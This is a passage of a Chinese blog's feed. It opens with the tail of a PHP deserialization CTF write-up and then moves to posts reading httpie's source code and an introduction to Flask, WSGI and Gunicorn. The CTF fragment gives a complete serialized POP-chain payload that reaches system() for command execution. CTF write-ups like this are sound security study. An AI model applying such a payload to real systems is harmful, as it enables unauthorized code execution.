highlight_file(__FILE__);&#125;</code></pre><p>这题入手稍加分析，就知道想要拿到flag利用的链条必然是利用以<code>destruct</code>为链首的pop链通过<code>a-&gt;b-&gt;a-&gt;c-&gt;a</code>利用c中的那个奇怪的array()调用类a中的<code>resolve</code>方法，或者说成员函数，利用a被摧毁时的add调用，b中的return字符串调用a中的<code>toString</code>这样把整个链条串起来，这样链条就贯通了，我说的三个点便是串起链条的节点。</p><p><code>paylopad:?tryhackme=O:1:&quot;a&quot;:1:&#123;s:6:&quot;object&quot;;O:1:&quot;b&quot;:1:&#123;s:11:&quot;%00*%00filename&quot;;O:1:&quot;a&quot;:1:&#123;s:6:&quot;object&quot;;O:1:&quot;c&quot;:1:&#123;s:9:&quot;%00c%00string&quot;;a:1:&#123;s:6:&quot;string&quot;;a:2:&#123;i:0;O:1:&quot;a&quot;:2:&#123;s:6:&quot;object&quot;;N;s:2:&quot;ls&quot;;a:1:&#123;i:0;s:6:&quot;system&quot;;&#125;&#125;i:1;s:7:&quot;resolve&quot;;&#125;&#125;&#125;&#125;&#125;&#125;</code></p><hr><p>特别鸣谢：Longlone，AFKL出题和题解的参考</p><blockquote><p>Don’t listen to those who say,</p><p>“It’s not done that way.”</p><p>Maybe it’s not, but maybe you will.</p><p>Don’t listen to those who say,</p><p>“You’re taking too big a chance.”</p><p>Michelangelo would have painted the Sistine Floor,</p><p>and it would surely be rubbed out by today.</p><p>Most importantly, don’t listen</p><p>When the little voice of fear inside of you</p><p>rear its ugly head and says,</p><p>“They’re all smarter than you out there.</p><p>They’re more talented,</p><p>They’re taller, blonder, prettier, luckier and have connections…”</p><p>I firmly believe that if you follow a path that interests you,</p><p>Not to the exclusion of love, sensitivity, and cooperation with others,</p><p>But with the strength of conviction</p><p>That you can move others by your own efforts,</p><p>And do not make success or failure the criteria by which you live,</p><p>The chances are you’ll be a person worthy of your own respect.</p><p>by Marvin Neil Simon</p></blockquote><p>2021/3/30</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;​&lt;/p&gt;
&lt;p&gt;​ &lt;strong&gt;本文假设读者对于php面向对象有一定了解&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a&gt;前置知识</summary>
      
    
    
    
    <category term="Web" scheme="https://zwh-china.github.io/categories/Web/"/>
    
    
  </entry>
  
  <entry>
    <title>httpie 项目源码阅读（4）</title>
    <link href="https://zwh-china.github.io/2021/03/16/httpie-%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%884%EF%BC%89/"/>
    <id>https://zwh-china.github.io/2021/03/16/httpie-%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%884%EF%BC%89/</id>
    <published>2021-03-16T11:27:45.000Z</published>
    <updated>2021-04-20T21:15:38.466Z</updated>
    
    
    
    
    <category term="Python学习" scheme="https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>httpie项目源码阅读(3)</title>
    <link href="https://zwh-china.github.io/2021/03/07/httpie%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB3/"/>
    <id>https://zwh-china.github.io/2021/03/07/httpie%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB3/</id>
    <published>2021-03-06T19:28:29.000Z</published>
    <updated>2021-04-20T21:15:38.465Z</updated>
    
    <content type="html"><![CDATA[<p>由于httpie源码较多，全局变量引用较多。作为新手，我决定先去仔细看看httpie官方doc。先让自己基本完全掌握httpie各种用法，再对httpie源码进行进一步梳理和阅读</p><p>doc链接：<a href="https://httpie.io/docs">https://httpie.io/docs</a></p><p>项目地址：<a href="https://github.com/httpie/httpie">https://github.com/httpie/httpie</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;由于httpie源码较多，全局变量引用较多。作为新手，我决定先去仔细看看httpie官方doc。先让自己基本完全掌握httpie各种用法，再对httpie源码进行进一步梳理和阅读&lt;/p&gt;
&lt;p&gt;doc链接：&lt;a href=&quot;https://httpie.io/docs&quot;&gt;h</summary>
      
    
    
    
    <category term="Python学习" scheme="https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>httpie 项目源码阅读（2）</title>
    <link href="https://zwh-china.github.io/2021/03/07/httpie-%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%882%EF%BC%89/"/>
    <id>https://zwh-china.github.io/2021/03/07/httpie-%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%882%EF%BC%89/</id>
    <published>2021-03-06T17:13:55.000Z</published>
    <updated>2021-04-20T21:15:38.464Z</updated>
    
    <content type="html"><![CDATA[<p>看完<code>status.py</code>再看<code>core.py</code></p><pre><code>import argparseimport osimport platformimport sysfrom typing import List, Optional, Tuple, Unionimport requestsfrom pygments import __version__ as pygments_versionfrom requests import __version__ as requests_versionfrom httpie import __version__ as httpie_versionfrom httpie.cli.constants import OUT_REQ_BODY, OUT_REQ_HEAD, OUT_RESP_BODY, OUT_RESP_HEADfrom httpie.client import collect_messagesfrom httpie.context import Environmentfrom httpie.downloads import Downloaderfrom httpie.output.writer import write_message, write_stream, MESSAGE_SEPARATOR_BYTESfrom httpie.plugins.registry import plugin_managerfrom httpie.status import ExitStatus, http_status_to_exit_status# noinspection PyDefaultArgumentdef main(args: List[Union[str, bytes]] = sys.argv, env=Environment()) -&gt; ExitStatus:    &quot;&quot;&quot;    The main function.    Pre-process args, handle some special types of invocations,    and run the main program with error handling.    Return exit status code.    &quot;&quot;&quot;    program_name, *args = args    env.program_name = os.path.basename(program_name)    args = decode_raw_args(args, env.stdin_encoding)    plugin_manager.load_installed_plugins()    from httpie.cli.definition import parser    if env.config.default_options:        args = env.config.default_options + args    include_debug_info = &#39;--debug&#39; in args    include_traceback = include_debug_info or &#39;--traceback&#39; in args    if include_debug_info:        print_debug_info(env)        if args == [&#39;--debug&#39;]:            return ExitStatus.SUCCESS    exit_status = ExitStatus.SUCCESS    try:        parsed_args = parser.parse_args(            args=args,            env=env,        )    except KeyboardInterrupt:        env.stderr.write(&#39;\n&#39;)        if include_traceback:            raise        exit_status = ExitStatus.ERROR_CTRL_C    except SystemExit as e:        if e.code != ExitStatus.SUCCESS:            env.stderr.write(&#39;\n&#39;)            if include_traceback:                raise            exit_status = ExitStatus.ERROR    else:        try:            exit_status = program(                args=parsed_args,                env=env,            )        except KeyboardInterrupt:            env.stderr.write(&#39;\n&#39;)            if include_traceback:                raise            exit_status = ExitStatus.ERROR_CTRL_C        except SystemExit as e:            if e.code != ExitStatus.SUCCESS:                env.stderr.write(&#39;\n&#39;)                if include_traceback:                    raise                exit_status = ExitStatus.ERROR        except requests.Timeout:            exit_status = ExitStatus.ERROR_TIMEOUT            env.log_error(f&#39;Request timed out (&#123;parsed_args.timeout&#125;s).&#39;)        except requests.TooManyRedirects:            exit_status = ExitStatus.ERROR_TOO_MANY_REDIRECTS            env.log_error(                f&#39;Too many redirects&#39;                f&#39; (--max-redirects=&#123;parsed_args.max_redirects&#125;).&#39;            )        except Exception as e:            # TODO: Further distinction between expected and unexpected errors.            msg = str(e)            if hasattr(e, &#39;request&#39;):                request = e.request                if hasattr(request, &#39;url&#39;):                    msg = (                        f&#39;&#123;msg&#125; while doing a &#123;request.method&#125;&#39;                        f&#39; request to URL: &#123;request.url&#125;&#39;                    )            env.log_error(f&#39;&#123;type(e).__name__&#125;: &#123;msg&#125;&#39;)            if include_traceback:                raise            exit_status = ExitStatus.ERROR    return exit_statusdef get_output_options(    args: argparse.Namespace,    message: Union[requests.PreparedRequest, requests.Response]) -&gt; Tuple[bool, bool]:    return &#123;        requests.PreparedRequest: (            OUT_REQ_HEAD in args.output_options,            OUT_REQ_BODY in args.output_options,        ),        requests.Response: (            OUT_RESP_HEAD in args.output_options,            OUT_RESP_BODY in args.output_options,        ),    &#125;[type(message)]def program(args: argparse.Namespace, env: Environment) -&gt; ExitStatus:    &quot;&quot;&quot;    The main program without error handling.    &quot;&quot;&quot;    # TODO: Refactor and drastically simplify, especially so that the separator logic is elsewhere.    exit_status = ExitStatus.SUCCESS    downloader = None    initial_request: Optional[requests.PreparedRequest] = None    final_response: Optional[requests.Response] = None    def separate():        getattr(env.stdout, &#39;buffer&#39;, env.stdout).write(MESSAGE_SEPARATOR_BYTES)    def request_body_read_callback(chunk: bytes):        should_pipe_to_stdout = bool(            # Request body output desired            OUT_REQ_BODY in args.output_options            # &amp; not `.read()` already pre-request (e.g., for  compression)            and initial_request            # &amp; non-EOF chunk            and chunk        )        if should_pipe_to_stdout:            msg = requests.PreparedRequest()            msg.is_body_upload_chunk = True            msg.body = chunk            msg.headers = initial_request.headers            write_message(requests_message=msg, env=env, args=args, with_body=True, with_headers=False)    try:        if args.download:            args.follow = True  # --download implies --follow.            downloader = Downloader(output_file=args.output_file, progress_file=env.stderr, resume=args.download_resume)            downloader.pre_request(args.headers)        messages = collect_messages(args=args, config_dir=env.config.directory,                                    request_body_read_callback=request_body_read_callback)        force_separator = False        prev_with_body = False        # Process messages as they’re generated        for message in messages:            is_request = isinstance(message, requests.PreparedRequest)            with_headers, with_body = get_output_options(args=args, message=message)            do_write_body = with_body            if prev_with_body and (with_headers or with_body) and (force_separator or not env.stdout_isatty):                # Separate after a previous message with body, if needed. See test_tokens.py.                separate()            force_separator = False            if is_request:                if not initial_request:                    initial_request = message                    is_streamed_upload = not isinstance(message.body, (str, bytes))                    if with_body:                        do_write_body = not is_streamed_upload                        force_separator = is_streamed_upload and env.stdout_isatty            else:                final_response = message                if args.check_status or downloader:                    exit_status = http_status_to_exit_status(http_status=message.status_code, follow=args.follow)                    if exit_status != ExitStatus.SUCCESS and (not env.stdout_isatty or args.quiet):                        env.log_error(f&#39;HTTP &#123;message.raw.status&#125; &#123;message.raw.reason&#125;&#39;, level=&#39;warning&#39;)            write_message(requests_message=message, env=env, args=args, with_headers=with_headers,                          with_body=do_write_body)            prev_with_body = with_body        # Cleanup        if force_separator:            separate()        if downloader and exit_status == ExitStatus.SUCCESS:            # Last response body download.            download_stream, download_to = downloader.start(                initial_url=initial_request.url,                final_response=final_response,            )            write_stream(stream=download_stream, outfile=download_to, flush=False)            downloader.finish()            if downloader.interrupted:                exit_status = ExitStatus.ERROR                env.log_error(                    &#39;Incomplete download: size=%d; downloaded=%d&#39; % (                        downloader.status.total_size,                        downloader.status.downloaded                    ))        return exit_status    finally:        if downloader and not downloader.finished:            downloader.failed()        if not isinstance(args, list) and args.output_file and args.output_file_specified:            args.output_file.close()def print_debug_info(env: Environment):    env.stderr.writelines([        f&#39;HTTPie &#123;httpie_version&#125;\n&#39;,        f&#39;Requests &#123;requests_version&#125;\n&#39;,        f&#39;Pygments &#123;pygments_version&#125;\n&#39;,        f&#39;Python &#123;sys.version&#125;\n&#123;sys.executable&#125;\n&#39;,        f&#39;&#123;platform.system()&#125; &#123;platform.release()&#125;&#39;,    ])    env.stderr.write(&#39;\n\n&#39;)    env.stderr.write(repr(env))    env.stderr.write(&#39;\n&#39;)def decode_raw_args(    args: List[Union[str, bytes]],    stdin_encoding: str) -&gt; List[str]:    &quot;&quot;&quot;    Convert all bytes args to str    by decoding them using stdin encoding.    &quot;&quot;&quot;    return [        arg.decode(stdin_encoding)        if type(arg) is bytes else arg        for arg in args    ]</code></pre><p>先看main函数，可以看到这里的函数注释和<code>__main__.py</code> 不太一样，发现是从<code>typing</code>中导入的，查阅官方文档得知这个模块是辅助函数注释的。main函数的参数有两个，一个是cli用户输入的启动参数，使用<code>sys.argv</code>读入，再看另一个参数是Environment类的实例化，这个Environment类是用户自定义类，从<code>context.py</code> 中导入。那我们再去看一下Environment类的定义</p><pre><code>context.pyimport sysimport osfrom pathlib import Pathfrom typing import IO, Optionaltry:    import cursesexcept ImportError:    curses = None  # Compiled w/o cursesfrom httpie.compat import is_windowsfrom httpie.config import DEFAULT_CONFIG_DIR, Config, ConfigFileErrorfrom httpie.utils import repr_dictclass Environment:    &quot;&quot;&quot;    Information about the execution context    (standard streams, config directory, etc).    By default, it represents the actual environment.    All of the attributes can be overwritten though, which    is used by the test suite to simulate various scenarios.    &quot;&quot;&quot;    is_windows: bool = is_windows    config_dir: Path = DEFAULT_CONFIG_DIR    stdin: Optional[IO] = sys.stdin  # `None` when closed fd (#791)    stdin_isatty: bool = stdin.isatty() if stdin else False    stdin_encoding: str = None    stdout: IO = sys.stdout    stdout_isatty: bool = stdout.isatty()    stdout_encoding: str = None    stderr: IO = sys.stderr    stderr_isatty: bool = stderr.isatty()    colors = 256    program_name: str = &#39;http&#39;    if not is_windows:        if curses:            try:                curses.setupterm()                colors = curses.tigetnum(&#39;colors&#39;)            except curses.error:                pass    else:        # noinspection PyUnresolvedReferences        import colorama.initialise        stdout = colorama.initialise.wrap_stream(            stdout, convert=None, strip=None,            autoreset=True, wrap=True        )        stderr = colorama.initialise.wrap_stream(            stderr, convert=None, strip=None,            autoreset=True, wrap=True        )        del colorama    def __init__(self, devnull=None, **kwargs):        &quot;&quot;&quot;        Use keyword arguments to overwrite        any of the class attributes for this instance.        &quot;&quot;&quot;        assert all(hasattr(type(self), attr) for attr in kwargs.keys())        self.__dict__.update(**kwargs)        # The original STDERR unaffected by --quiet’ing.        self._orig_stderr = self.stderr        self._devnull = devnull        # Keyword arguments &gt; stream.encoding &gt; default utf8        if self.stdin and self.stdin_encoding is None:            self.stdin_encoding = getattr(                self.stdin, &#39;encoding&#39;, None) or &#39;utf8&#39;        if self.stdout_encoding is None:            actual_stdout = self.stdout            if is_windows:                # noinspection PyUnresolvedReferences                from colorama import AnsiToWin32                if isinstance(self.stdout, AnsiToWin32):                    # noinspection PyUnresolvedReferences                    actual_stdout = self.stdout.wrapped            self.stdout_encoding = getattr(                actual_stdout, &#39;encoding&#39;, None) or &#39;utf8&#39;    def __str__(self):        defaults = dict(type(self).__dict__)        actual = dict(defaults)        actual.update(self.__dict__)        actual[&#39;config&#39;] = self.config        return repr_dict(&#123;            key: value            for key, value in actual.items()            if not key.startswith(&#39;_&#39;)        &#125;)    def __repr__(self):        return f&#39;&lt;&#123;type(self).__name__&#125; &#123;self&#125;&gt;&#39;    _config: Config = None    @property    def config(self) -&gt; Config:        config = self._config        if not config:            self._config = config = Config(directory=self.config_dir)            if not config.is_new():                try:                    config.load()                except ConfigFileError as e:                    self.log_error(e, level=&#39;warning&#39;)        return config    @property    def devnull(self) -&gt; IO:        if self._devnull is None:            self._devnull = open(os.devnull, &#39;w+&#39;)        return self._devnull    @devnull.setter    def devnull(self, value):        self._devnull = value    def log_error(self, msg, level=&#39;error&#39;):        assert level in [&#39;error&#39;, &#39;warning&#39;]        self._orig_stderr.write(f&#39;\n&#123;self.program_name&#125;: &#123;level&#125;: &#123;msg&#125;\n\n&#39;)</code></pre><p>可以看到这部分完全就是定义了Environment类。先看类的属性is_windows是一个布尔型变量是从<code>compat.py</code>引入。那我们再去看一下<code>compat.py</code></p><pre><code>import sysis_windows = &#39;win32&#39; in str(sys.platform).lower()</code></pre><p>可以看到很简单，通过<code>sys.platform</code>函数返回值全部小写化后判断其中是否包含win32字符串来判断运行的系统是否为windows。</p><p>再看下一个属性<code>config_dir</code></p><p>可以看到这个属性的类型是Path类型，这个是从<code>pathlib</code>中导入的从官方说法来看这个库主要是替代<code>os.path</code>用的，因为用<code>os.path</code>来处理路径有时候可能比较麻烦需要嵌套写法，<code>pathlib</code> 的出现就很好地解决了这一问题，<code>pathlib</code>采用链式调用。说白了就是<code>os.path</code>需要拼来拼去来组合，但是<code>path1ib</code>就就可以通过类似访问子目录和父目录的方法实现目录的跳转。小技巧get :)</p><p>这其中主要就是设置httpie的配置路径，例如在windows下就是APPDATA文件夹中</p><p>再回看context.py中的后半部分，就是重定向标准输入输出，使用curses库来达到彩色文字的效果。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;看完&lt;code&gt;status.py&lt;/code&gt;再看&lt;code&gt;core.py&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import argparse
import os
import platform
import sys
from typing import Lis</summary>
      
    
    
    
    <category term="Python学习" scheme="https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>httpie 项目源码阅读（1）</title>
    <link href="https://zwh-china.github.io/2021/03/04/httpie-%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%881%EF%BC%89/"/>
    <id>https://zwh-china.github.io/2021/03/04/httpie-%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%881%EF%BC%89/</id>
    <published>2021-03-04T12:49:30.000Z</published>
    <updated>2021-04-20T21:15:38.462Z</updated>
    
    <content type="html"><![CDATA[<h1 id="httpie-项目源码阅读（1）"><a href="#httpie-项目源码阅读（1）" class="headerlink" title="httpie 项目源码阅读（1）"></a>httpie 项目源码阅读（1）</h1><p>先放上项目链接<code>https://github.com/httpie/httpie</code></p><p>这个项目大概就是作为一个cli-http访问工具，会得到服务器返回的数据头</p><p>以下是项目页readme的简单介绍</p><pre><code>HTTPie (pronounced aitch-tee-tee-pie) is a command-line HTTP client. Its goal is to make CLI interaction with web services as human-friendly as possible. HTTPie is designed for testing, debugging, and generally interacting with APIs &amp; HTTP servers. The http &amp; https commands allow for creating and sending arbitrary HTTP requests. They use simple and natural syntax and provide formatted and colorized output.</code></pre><p>项目结构:</p><pre><code>httpie│  .editorconfig│  .gitignore│  AUTHORS.rst│  CHANGELOG.rst│  CODE_OF_CONDUCT.md│  CONTRIBUTING.rst│  httpie.gif│  httpie.png│  LICENSE│  Makefile│  MANIFEST.in│  README.rst│  requirements-dev.txt│  setup.cfg│  setup.py│  tree.txt│  ├─.github│  ├─ISSUE_TEMPLATE│  │      bug_report.md│  │      feature_request.md│  │      other.md│  │      │  └─workflows│          build.yml│          ├─extras│      brew-deps.py│      httpie-completion.bash│      httpie-completion.fish│      httpie.rb│      ├─httpie│  │  client.py│  │  compat.py│  │  config.py│  │  context.py│  │  core.py│  │  downloads.py│  │  models.py│  │  sessions.py│  │  ssl.py│  │  status.py│  │  uploads.py│  │  utils.py│  │  __init__.py│  │  __main__.py│  │  │  ├─cli│  │      argparser.py│  │      argtypes.py│  │      constants.py│  │      definition.py│  │      dicts.py│  │      exceptions.py│  │      requestitems.py│  │      __init__.py│  │      │  ├─output│  │  │  processing.py│  │  │  streams.py│  │  │  writer.py│  │  │  __init__.py│  │  │  │  │  └─formatters│  │          colors.py│  │          headers.py│  │          json.py│  │          __init__.py│  │          │  └─plugins│          base.py│          builtin.py│          manager.py│          registry.py│          __init__.py│          └─tests    │  conftest.py    │  README.rst    │  test_auth.py    │  test_auth_plugins.py    │  test_binary.py    │  test_cli.py    │  test_compress.py    │  test_config.py    │  test_defaults.py    │  test_docs.py    │  test_downloads.py    │  test_errors.py    │  test_exit_status.py    │  test_httpie.py    │  test_offline.py    │  test_output.py    │  test_redirects.py    │  test_regressions.py    │  test_sessions.py    │  test_ssl.py    │  test_stream.py    │  test_tokens.py    │  test_unicode.py    │  test_uploads.py    │  test_windows.py    │      ├─client_certs    │      client.crt    │      client.key    │      client.pem    │          ├─fixtures    │      test.bin    │      test.json    │      test.txt    │      __init__.py    │          └─utils        │  __init__.py        │          └─matching                parsing.py                test_matching.py                __init__.py</code></pre><p>可以看到项目采用了Python的rst文档，差不多有点像MarkDown，主要用于python的在线文档，据说如果写代码的时候用特殊代码格式，就可以直接生成项目的rst文档十分方便（暂时没亲手试验过）</p><p>还能看到setup.py说明是可以安装的，关于setup.py是干嘛的可以参考这篇文章</p><p><a href="https://docs.python-guide.org/writing/structure/">https://docs.python-guide.org/writing/structure/</a></p><p>可以看到这个项目是配套了pytest进行测试的，这个放到以后篇幅研究。</p><p>先进httpie目录，可以看<code>__main__</code>和 <code>__init__</code></p><p><code>__init__.py</code>是这样的</p><pre><code>&quot;&quot;&quot;HTTPie: command-line HTTP client for the API era.&quot;&quot;&quot;__version__ = &#39;2.5.0-dev&#39;__author__ = &#39;Jakub Roztocil&#39;__licence__ = &#39;BSD&#39;</code></pre><p>可以看到是写了项目版本，作者，适用的Licence</p><p>再看<code>__main__.py</code></p><pre><code>#!/usr/bin/env python&quot;&quot;&quot;The main entry point. Invoke as `http&#39; or `python -m httpie&#39;.This module can catch all the exception during runtime and perform as the main entry point of the whole program&quot;&quot;&quot;import sysdef main():    try:        from .core import main        exit_status = main()    except KeyboardInterrupt:        from httpie.status import ExitStatus        exit_status = ExitStatus.ERROR_CTRL_C  # import the pre-define constant value to represent KeyBoardInterrupt    sys.exit(exit_status.value)if __name__ == &#39;__main__&#39;:    main()</code></pre><p><code>main.py</code> 的作用是作为程序入口，用于作为导火索来启动程序的其他模块同时做一个try-catch的包裹来处理程序运行时出现的异常。</p><p>从同级目录<code>core.py</code>引入主函数，并且运行。如果遇到键盘中断(Ctrl+C)异常就会从同级目录<code>status.py</code>中引入退出状态类。</p><p>先看<code>status.py</code>中的代码</p><pre><code>from enum import IntEnum, unique@uniqueclass ExitStatus(IntEnum):    &quot;&quot;&quot;Program exit status code constants.&quot;&quot;&quot;    SUCCESS = 0    ERROR = 1    ERROR_TIMEOUT = 2    # See --check-status    ERROR_HTTP_3XX = 3    ERROR_HTTP_4XX = 4    ERROR_HTTP_5XX = 5    ERROR_TOO_MANY_REDIRECTS = 6    PLUGIN_ERROR = 7    # 128+2 SIGINT    # &lt;http://www.tldp.org/LDP/abs/html/exitcodes.html&gt;    ERROR_CTRL_C = 130def http_status_to_exit_status(http_status: int, follow=False) -&gt; ExitStatus:    &quot;&quot;&quot;    Translate HTTP status code to exit status code.    (Relevant only when invoked with --check-status or --download.)    &quot;&quot;&quot;    if 300 &lt;= http_status &lt;= 399 and not follow:        # Redirect        return ExitStatus.ERROR_HTTP_3XX    elif 400 &lt;= http_status &lt;= 499:        # Client Error        return ExitStatus.ERROR_HTTP_4XX    elif 500 &lt;= http_status &lt;= 599:        # Server Error        return ExitStatus.ERROR_HTTP_5XX    else:        return ExitStatus.SUCCESS</code></pre><p>引入了python内置的枚举类，使用unique装饰器修饰枚举类<code>ExitStatus</code> ,同时注意到这里是类的实例化。枚举类的特点就是其中属性值必须是唯一不能重复的，也不能被外部修改。加上unique装饰器后，则在类中属性是唯一的不能被覆写。这个类中定义了程序退出常量值。下面的<code>def http_status_to_exit_status(http_status: int, follow=False) -&gt; ExitStatus:</code></p><p>其实是函数注释，例如注释了参数中<code>http_status</code>类型是<code>int</code>,注释了返回值是<code>ExitStatus</code>。值得注意的是Python并不对函数注释进行检查，也就是说，传入值类型不是注释类型时，Python也不会进行提示。同时函数的注释信息存储在<code>函数名.__annotations__</code>这样一个字典中。函数的内容就是看<code>http_status</code>是多少，然后转换成<code>ExitStatus</code>中的属性值(pre-defined constant)。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;httpie-项目源码阅读（1）&quot;&gt;&lt;a href=&quot;#httpie-项目源码阅读（1）&quot; class=&quot;headerlink&quot; title=&quot;httpie 项目源码阅读（1）&quot;&gt;&lt;/a&gt;httpie 项目源码阅读（1）&lt;/h1&gt;&lt;p&gt;先放上项目链接&lt;code&gt;h</summary>
      
    
    
    
    <category term="Python学习" scheme="https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>Python Flask入门(1)</title>
    <link href="https://zwh-china.github.io/2021/01/19/python-flask%E5%85%A5%E9%97%A81/"/>
    <id>https://zwh-china.github.io/2021/01/19/python-flask%E5%85%A5%E9%97%A81/</id>
    <published>2021-01-18T18:02:40.000Z</published>
    <updated>2021-04-20T21:15:38.460Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>As I touched these things for the first time, I feel confused. So here I want to explain what are they and why we use them.</p><h3 id="Official-Introduction"><a href="#Official-Introduction" class="headerlink" title="Official Introduction"></a>Official Introduction</h3><p>WSGI</p><blockquote><p>WSGI is the Web Server Gateway Interface. It is a specification that describes how a web server communicates with web applications, and how web applications can be chained together to process one request.</p></blockquote><p>Gunicorn</p><blockquote><p>Gunicorn ‘Green Unicorn’ is a Python WSGI HTTP Server for UNIX. It’s a pre-fork worker model. The Gunicorn server is broadly compatible with various web frameworks, simply implemented, light on server resources, and fairly speedy.</p></blockquote><p>Flask</p><blockquote><p>Flask is a lightweight <a href="https://wsgi.readthedocs.io/">WSGI</a> web application framework. It is designed to make getting started quick and easy, with the ability to scale up to complex applications. It began as a simple wrapper around <a href="https://www.palletsprojects.com/p/werkzeug/">Werkzeug</a> and <a href="https://www.palletsprojects.com/p/jinja/">Jinja</a> and has become one of the most popular Python web application frameworks.</p></blockquote><p>Werkzeug</p><blockquote><p><em>werkzeug</em> German noun: “tool”. Etymology: <em>werk</em> (“work”), <em>zeug</em> (“stuff”)</p><p>Werkzeug is a comprehensive <a href="https://wsgi.readthedocs.io/en/latest/">WSGI</a> web application library. It began as a simple collection of various utilities for WSGI applications and has become one of the most advanced WSGI utility libraries.</p></blockquote><p>Jinja</p><blockquote><p>Jinja2 is a full-featured template engine for Python. It has full Unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.</p></blockquote><h3 id="About-Werkzeug"><a href="#About-Werkzeug" class="headerlink" title="About Werkzeug"></a>About Werkzeug</h3><p>As the official introduction says the Werzeug is a tool set based on the standard of WSGI. And Flask was developed based on the Werkzeug. If you try before use only Flask to hold a simple website, you may have noticed that the HTTP Response form the server indicates the remote server is Werkzeug. The reason behind this is that if you do not use Gunicorn or something else to act as webserver the Flask will use its simple built-in server. And of course since the Flask is based on Werkzeug the server inside Flask is also based on Werkzeug.</p><h3 id="About-Gunicorn"><a href="#About-Gunicorn" class="headerlink" title="About Gunicorn"></a>About Gunicorn</h3><h5 id="why-using-Nginx-Gunicorn"><a href="#why-using-Nginx-Gunicorn" class="headerlink" title="why using Nginx+Gunicorn"></a>why using Nginx+Gunicorn</h5><p>Often, we use the configuration like Nginx+Gunicorn+Flask just like Nginx+Apache+PHP. The Flask is not a webserver (though it has a simple built-in webserver) so it needs a web server like Nginx Apache or Gunicorn. Then you may still fell confused why we use Nginx? Shall we just use Gunicorn? Here I want to invoke an explanation from the StackOverFlow</p><blockquote><p>The reason why people run Nginx and Gunicorn together is that in addition to being a web server, Nginx can also proxy connections to Gunicorn which brings certain performance benefits, here is a pretty good answer that elaborates on those benefits: <a href="https://serverfault.com/questions/220046/why-is-setting-nginx-as-a-reverse-proxy-a-good-idea">https://serverfault.com/questions/220046/why-is-setting-nginx-as-a-reverse-proxy-a-good-idea</a></p></blockquote><p>Basically Nginx is good at dealing requests and have some of the advantages that using Gunicorn alone cannot achieve. As a result,it is often a better idea to use Nginx+Gunicorn.</p><h5 id="why-using-none-native-webserver-Flask’s-built-in-webserver"><a href="#why-using-none-native-webserver-Flask’s-built-in-webserver" class="headerlink" title="why using none-native webserver (Flask’s built-in webserver)"></a>why using none-native webserver (Flask’s built-in webserver)</h5><p>You may also be curious that why we need to use additional webserver like Gunicorn Webserver instead of using Flask’s built-in webserver. That is account for the efficiency and the stability of Flask’s simple webserver. The built-in webserver is simply <strong>not strong</strong> enough for production environment. As the official Flask website says</p><blockquote><p>While lightweight and easy to use, <strong>Flask’s built-in server is not suitable for production</strong> as it doesn’t scale well and by default serves only one request at a time. Some of the options available for properly running Flask in production are documented here.</p></blockquote><h3 id="About-WSGI"><a href="#About-WSGI" class="headerlink" title="About WSGI"></a>About WSGI</h3><p>As for WSGI I copy an answer from the StackOverFlow since I also fell confused. :)</p><blockquote><p>Both CGI(Common Gateway Interface) and WSGI define standard interfaces that programs can use to handle web requests. The CGI interface is at a lower level than WSGI, and involves the server setting up environment variables containing the data from the HTTP request, with the program returning something formatted pretty much like a bare HTTP server response.</p><p>WSGI, on the other hand, is a Python-specific, <strong>slightly higher-level</strong> interface that allows programmers to write applications that are server-agnostic and which can be wrapped in other WSGI applications (middleware).</p><p><a href="https://stackoverflow.com/questions/4929626/what-are-wsgi-and-cgi-in-plain-english">Link</a></p></blockquote><p>The WSGI also include or support CGI. I find another ZhiHu passage may help you better understanding these confusing concepts.<a href="https://zhuanlan.zhihu.com/p/25013398">CGI-All In One</a> In the text author summarize that WSGI for Python and Servlet for Java are “one thing” that share some same commons. One thing that needs to emphasis is that WSGI is not a Web Application, a framework, a Python module, a server, a software. It is more like a standard that set a rule that describes how web application communicate with the webserver.</p><p><img src="http://106.15.74.181/wp-content/uploads/2021/01/cgi-gateway.jpg"></p><blockquote><p>Picture from the author of ZhiHu passage above. Will remove if Infringing</p><p>For more about WSGI you can review this passage <a href="https://www.cnblogs.com/wangcoo/p/10018373.html">https://www.cnblogs.com/wangcoo/p/10018373.html</a></p></blockquote><h3 id="About-Jinja"><a href="#About-Jinja" class="headerlink" title="About Jinja"></a>About Jinja</h3><p>Jinja2 is a template engine for Flask to generate content</p><h3 id="In-general"><a href="#In-general" class="headerlink" title="In general"></a>In general</h3><p>Finally we can form a basic skeleton in our mind that.</p><p>Web-Request -&gt; Nginx -&gt; Gunicorn -&gt; WSGI -&gt;<strong>Flask</strong>&lt;- Jinja2 &lt;- Template</p><p>Flask (WebApplicationFramework) &lt;- Werkzeug (tool set) 